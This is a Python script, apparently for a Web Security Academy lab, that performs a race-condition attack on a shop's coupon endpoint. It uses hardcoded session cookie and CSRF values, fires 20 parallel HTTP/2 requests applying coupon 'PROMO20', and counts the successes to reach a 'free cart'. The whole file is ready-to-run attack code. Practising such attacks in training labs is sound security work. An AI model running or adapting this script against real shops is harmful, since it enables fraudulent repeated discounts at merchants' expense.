import asyncio
import httpx
import time

# CONFIGURABLE VARIABLES
hostid = '0a99000b034d1e9c83117d7e006100d0'
cookies_session = 'gkPkvG4hppMAxrKAMADlUr8f8PpBjyuV'
csrftoken = 'YSEgDrGqlm7IYUSOb5nOV494wnyRYG5x'
payload = 'PROMO20'

async def http2_attack():
    url = f"https://{hostid}.web-security-academy.net/cart/coupon"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": f"session={cookies_session}",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document"
    }
    data = f"csrf={csrftoken}&coupon={payload}"
    
    print(f"[*] Starting HTTP/2 attack at {time.ctime()}")
    print(f"[*] Strategy: HTTP/2 multiplexing for true parallelism")
    print("-" * 60)
    
    success_counter = 0
    
    # Use httpx with HTTP/2 support
    async with httpx.AsyncClient(http2=True) as client:
        # Create ALL tasks first
        tasks = []
        for i in range(20):
            task = asyncio.create_task(
                http2_request(client, url, headers, data, i)
            )
            tasks.append(task)
        
        # Execute ALL tasks with HTTP/2 multiplexing
        print(f"[*] Firing 20 HTTP/2 requests...")
        start_time = time.time()
        results = await asyncio.gather(*tasks)
        success_counter = sum(results)
    
    print("-" * 60)
    print(f"[*] Attack completed at {time.ctime()}")
    print(f"[*] Total SUCCESS responses: {success_counter}")
    
    if success_counter >= 5:
        print("[+] FREE CART ACHIEVED with HTTP/2!")
    else:
        print(f"[-] Only {success_counter} successes")

async def http2_request(client, url, headers, data, req_id):
    """Single HTTP/2 request"""
    start = time.time()
    try:
        response = await client.post(url, headers=headers, data=data, timeout=10.0)
        end = time.time()
        
        if "Coupon already applied" in response.text:
            result = "DUPLICATE"
            success = 0
        elif "apply coupon" in response.text or (response.status_code == 200 and len(response.text) == 7171):
            result = "SUCCESS"
            success = 1
        else:
            result = f"OTHER_{response.status_code}"
            success = 0
        
        print(f"[{req_id:02d}] {result} | Δ:{(end-start):.3f}s | HTTP/{response.http_version}")
        return success
        
    except Exception as e:
        print(f"[{req_id:02d}] ERROR: {str(e)[:20]}")
        return 0

if __name__ == "__main__":
    print("[!] HTTP/2 Race Condition Attack")
    print("[!] Requires: pip install httpx")
    input("Press Enter to launch HTTP/2 attack...")
    asyncio.run(http2_attack())
